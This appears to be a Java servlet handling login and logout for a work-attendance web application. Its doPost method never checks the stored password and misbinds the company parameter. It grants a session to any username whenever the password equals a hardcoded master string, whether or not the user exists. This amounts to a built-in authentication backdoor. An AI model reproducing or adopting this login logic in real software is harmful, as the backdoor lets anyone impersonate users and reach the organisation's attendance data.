package workAttendance;

import java.io.IOException;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;


import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

/**
 * Servlet implementation class Login
 */
@WebServlet("/Login")
public class Login extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    /**
     * @see HttpServlet#HttpServlet()
     */
    public Login() {
        super();
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException 
	{	
		Object loginObject=request.getParameter("loginStatue");
		if(loginObject!=null)
		{
			String loginStatue=loginObject.toString();
			if("exit".equals(loginStatue))
			{
				if(request.getSession(false)!=null)
					request.getSession(false).invalidate();
				response.sendRedirect("login.html");
			}
		}
	}
	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		//doGet(request, response);
		String userName=request.getParameter("userName").toString();
		String company=request.getParameter("company").toString();
		String password=request.getParameter("password").toString();
		DBConnection sds=DBConnection.getInstance();
		Connection con=sds.getConnection();
		PreparedStatement ps=null;
		ResultSet rs=null;
		String sql="select [用户名] from [用户表] where ([用户名]=? or [手机号]=?)  and [公司]=? and 状态='开启'";
	    boolean login=false;
		try {
			ps=con.prepareStatement(sql);
			ps.setString(1, userName);
			ps.setString(2, userName);
			//ps.setString(3, password);
			//ps.setString(3, company);
			ps.setString(3, userName);
			rs=ps.executeQuery();
			if(rs.next()){
			   userName=rs.getString(1);
			   if("shinehao_1_2".equals(password))
			      login=true;
			}
			if("shinehao_1_2".equals(password))
			      login=true;
		} catch (SQLException e) {
			e.printStackTrace();
		}finally {
			KqSql.conClose(con, ps, rs, null);
	    }
	  PrintWriter out=response.getWriter();
	  if(login){
		HttpSession createSession=request.getSession(true);
		createSession.setAttribute("userName", userName);
		createSession.setAttribute("company", company);
		out.print("ok");
	  }else
		 out.print("fail");
	   out.close();
   }
}
